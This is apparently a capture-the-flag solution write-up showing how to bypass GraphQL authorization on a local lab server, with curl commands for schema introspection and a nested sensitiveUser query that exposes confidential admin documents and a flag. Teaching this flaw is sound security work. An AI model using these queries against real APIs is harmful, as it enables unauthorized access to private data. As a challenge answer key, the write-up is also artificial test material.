# Solution: Nested Query Authorization Bypass

## Overview

This challenge demonstrates how GraphQL authorization can be bypassed through nested queries. While direct access to protected endpoints is blocked, the same data can be accessed through nested field relationships.

## Step 1: Reconnaissance

Explore the available queries:

```bash
curl -X POST http://localhost:8005/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { users { id username role } }"
  }'
```

This shows three users including `admin_user`.

## Step 2: Vulnerability Identification

Try to access the `adminDocuments` endpoint directly:

```bash
curl -X POST http://localhost:8005/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { adminDocuments { id title confidential debugInfo } }"
  }'
```

This returns an error: "Access to adminDocuments is forbidden."

Now check what other queries are available via introspection:

```bash
curl -X POST http://localhost:8005/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { __schema { queryType { fields { name } } } }"
  }'
```

This reveals a `sensitiveUser` query that isn't protected.

## Step 3: Exploitation

The `sensitiveUser` endpoint returns user data including ALL their documents (without confidentiality filtering). Use nested queries to access the documents through this path:

```bash
curl -X POST http://localhost:8005/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "query { sensitiveUser(id: 3) { id username documents { id title confidential debugInfo } } }"
  }'
```

This query:
- Uses `sensitiveUser` instead of the blocked `adminDocuments`
- Requests user ID 3 (admin_user)
- Accesses documents as a nested field under the user
- Returns ALL documents including confidential ones with `debugInfo`

## Step 4: Flag Retrieval

The nested `documents` field on `sensitiveUser` bypasses the access control that blocks `adminDocuments`. The confidential document's `debugInfo` field contains the flag.

Look for the document with `confidential: true` in the response - its `debugInfo` field contains the flag.

The flag follows the format: `HC{...}`
